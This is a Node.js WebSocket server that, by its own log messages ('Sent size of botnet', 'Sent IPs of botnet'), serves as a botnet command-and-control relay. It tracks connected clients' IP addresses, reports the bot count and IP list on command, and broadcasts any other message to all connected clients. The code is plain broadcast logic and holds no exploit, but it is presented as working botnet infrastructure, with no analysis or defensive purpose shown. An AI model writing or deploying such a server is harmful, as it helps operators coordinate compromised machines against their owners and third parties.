const WebSocket = require('ws');

const wss = new WebSocket.Server({ host: '0.0.0.0',  port: 8080 });

const clients = new Map();

wss.on('connection', (ws, req) => {
  const clientIP = req.socket.remoteAddress;
  clients.set(ws, clientIP);
  console.log(`Client connected: ${clientIP}`);

  ws.on('message', (message) => {
    console.log(`Received: ${message}`);

    if (message === 'getconscount') {
      ws.send(`${clients.size}`);
      console.log('Sent size of botnet');
    } else if (message === 'getconsips') {
      const ips = Array.from(clients.values()).join('|');
      ws.send(ips);
      console.log('Sent IPs of botnet');
    } else {
      // Broadcast to all other clients
      clients.forEach((_, client) => {
        if (client !== ws && client.readyState === WebSocket.OPEN) {
          client.send(message);
        }
      });
    }
  });

  ws.on('close', () => {
    clients.delete(ws);
    console.log(`Client disconnected: ${clientIP}`);
  });
});

console.log('WebSocket server running on ws://0.0.0.0:8080');
